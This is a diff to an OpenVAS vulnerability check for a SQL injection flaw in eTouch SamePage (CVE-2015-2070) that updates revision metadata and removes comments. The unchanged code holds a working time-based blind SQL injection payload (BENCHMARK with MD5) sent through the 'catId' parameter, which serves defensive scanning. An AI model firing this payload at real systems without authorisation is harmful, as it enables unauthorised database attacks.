@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_etouch_samepage_catid_sql_inj_vuln.nasl 7165 2017-09-18 08:57:44Z cfischer $
+# $Id: gb_etouch_samepage_catid_sql_inj_vuln.nasl 11291 2018-09-07 14:48:41Z mmartin $
 #
 # eTouch SamePage 'catId' Parameter SQL Injection Vulnerability
 #
@@ -27,11 +27,11 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805152");
-  script_version("$Revision: 7165 $");
+  script_version("$Revision: 11291 $");
   script_cve_id("CVE-2015-2070");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-09-18 10:57:44 +0200 (Mon, 18 Sep 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-07 16:48:41 +0200 (Fri, 07 Sep 2018) $");
   script_tag(name:"creation_date", value:"2015-03-16 16:36:52 +0530 (Mon, 16 Mar 2015)");
   script_name("eTouch SamePage 'catId' Parameter SQL Injection Vulnerability");
   script_category(ACT_ATTACK);
@@ -58,11 +58,9 @@ if(description)
   Impact Level: Application");
   script_tag(name:"affected", value:"eTouch SamePage Enterprise Edition
   4.4.0.0.239, Prior versions may also be affected.");
-  script_tag(name:"solution", value:"No solution or patch was made available
-  for at least one year since disclosure of this vulnerability. Likely none will
-  be provided anymore. General solution options are to upgrade to a newer release,
-  disable respective features, remove the product or replace the product by another
-  one.");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
+Likely none will be provided anymore.
+General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
 
   script_tag(name:"solution_type", value:"WillNotFix");
   script_tag(name:"qod_type", value:"remote_analysis");
@@ -73,10 +71,6 @@ if(description)
 include("http_func.inc");
 include("http_keepalive.inc");
 
-## Variable Initialization
-http_port = "";
-sndReq = "";
-rcvRes = "";
 wait_extra_sec = 5;
 
 http_port = get_http_port(default:18080);
@@ -89,7 +83,6 @@ foreach dir (make_list_unique("/", "/samepage", cgi_dirs(port:http_port)))
   sndReq = http_get(item:string(dir, "/cm/newui/wiki/index.jsp"), port:http_port);
   rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);
 
-  ## confirm the Application
   if(">SamePage" >< rcvRes && ">Dashboard<" >< rcvRes)
   {
     ## Added three times, to make sure its working properly
@@ -98,7 +91,6 @@ foreach dir (make_list_unique("/", "/samepage", cgi_dirs(port:http_port)))
     ## Use sleep time to check we are able to execute command
     foreach sec (sleep)
     {
-      ## Construct attack request
       url = "/cm/blogrss/feed?entity=mostviewedpost&analyticsType=blog&catId=-1)" +
             "%20AND%202345=BENCHMARK(" + sec + ",MD5(0x6b4e6459))%20AND%20(4924=" +
             "4924&count=10&et_cw=850&et_ch=600";
